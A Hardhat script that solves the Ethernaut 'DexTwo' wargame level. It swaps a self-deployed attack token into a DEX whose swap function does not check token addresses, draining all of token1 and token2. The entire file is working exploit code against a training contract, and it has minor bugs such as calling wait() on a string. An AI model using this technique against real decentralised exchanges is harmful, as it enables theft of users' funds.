import { ethers } from "hardhat";

const attackDexTwo = async () => {
    // change contract addresses here.
    const dexTwoAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
    const attackTokenAddress = ""; // from your deployed contract
    const token1Address = "0xc2A0E684884730Ad6483F83181b8343fF590C73A"; //type "await contract.token1()" in ethernaut console
    const token2Address = "0x84E81ee2A1e6059Ca392D908d9000b79cDDB2afE"; //type "await contract.token2()" in ethernaut console

    // Don't touch below
    // The vulnerability here arises from swap method which does not
    // check that the swap is necessarily between token1 and token2.
    // You may read more on:
    // https://eips.ethereum.org/EIPS/eip-20
    // We're going to swap our own token for token1 and token2
    // sample table below
    //       DEX             |      player
    // token1 - token2 - ATK | token1 - token2 - ATK
    // ---------------------------------------------
    //   100     100     100 |   10      10      300
    // TODO: automate token address getting from contract

    const contractAttack = await ethers.getContract("AttackToken");
    const approveATK = await contractAttack.approve(dexTwoAddress, 200);
    const approveATKtxn = await approveATK.wait();
    console.log(approveATKtxn);
    console.log("ATK token approved...Transfering next...");
    const send1 = await contractAttack.transfer(dexTwoAddress, 100);
    const send1txn = await send1.wait();
    console.log(send1txn);
    console.log("ATK sent to dexTwo...Draining token1...");

    const ABI = [
        "function approve(address spender, uint amount)",
        "function swap(address from, address to, uint amount)",
        "function balanceOf(address token, address account)",
    ];
    const contractDexTwo = await ethers.getContractAt(ABI, dexTwoAddress);
    const approve = await contractAttack.approve(dexTwoAddress, 300);
    const approveReceipt = await approve.wait();
    console.log(approveReceipt);
    const swap1 = await contractDexTwo.swap(attackTokenAddress, token1Address, 100);
    const swap1txn = await swap1.wait();
    console.log(swap1txn);
    // sample table below of balances from here
    //       DEX             |      player
    // token1 - token2 - EVL | token1 - token2 - EVL
    // ---------------------------------------------
    //   100     100     100 |   10      10      300
    //   0       100     200 |   110     10      200
    const token1Balance = await contractAttack
        .balanceOf(token1Address, dexTwoAddress)
        .then((v: any) => v.toString());
    const token1BalanceReceipt = token1Balance.wait(1);
    if (token1BalanceReceipt === "0") {
        console.log("Token1 balance is 0, continuing");
    } else {
        console.log("Token1 balance is not 0, continuing");
    }
    console.log("Draining token2...");
    const swap2 = await contractDexTwo.swap(attackTokenAddress, token2Address, 200);
    const swap2txn = await swap2.wait();
    console.log(swap2txn);
    const token2Balance = (await contractAttack.balanceOf(token2Address, dexTwoAddress)).toString();
    // const token2BalanceReceipt = token1Balance.wait(1);
    if (token2Balance === "0") {
        console.log("Token2 balance is 0, level passed and you can submit to ethernaut");
    } else {
        console.log("Token2 balance is not 0, review code above");
    }
    // final sample table below
    //       DEX             |      player
    // token1 - token2 - EVL | token1 - token2 - EVL
    // ---------------------------------------------
    //   100     100     100 |   10      10      300
    //   0       100     200 |   110     10      200
    //   0       0       400 |   110     110     0
};

attackDexTwo()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
